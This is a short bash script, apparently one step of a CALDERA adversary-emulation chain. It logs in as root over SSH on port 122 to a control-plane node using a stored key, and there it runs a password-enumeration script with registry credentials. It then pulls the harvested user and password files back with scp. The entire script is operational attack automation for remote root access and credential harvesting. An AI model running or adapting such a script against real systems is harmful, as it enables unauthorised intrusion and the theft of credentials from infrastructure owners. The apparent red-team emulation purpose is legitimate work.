#!/usr/bin/env bash
set -euo pipefail

SSH_KEY="$DATA_PATH/KC6/ssh/ssh-key"
OUT_FILE="$DATA_PATH/KC6/logenum"

ssh -i "$SSH_KEY" -p 122 "root@$CONTROL_PLANE_NODE" \
  /usr/bin/env bash -s -- "/tmp" "$REGISTRY_USER" "$REGISTRY_PASS" "$HOSTREGISTRY" \
  < /opt/caldera/KC2/pass-enum.sh > "$OUT_FILE"
scp -i "$SSH_KEY" -P 122 "root@$CONTROL_PLANE_NODE:/tmp/user" /tmp/user
scp -i "$SSH_KEY" -P 122 "root@$CONTROL_PLANE_NODE:/tmp/pass" /tmp/pass

cat "$OUT_FILE"
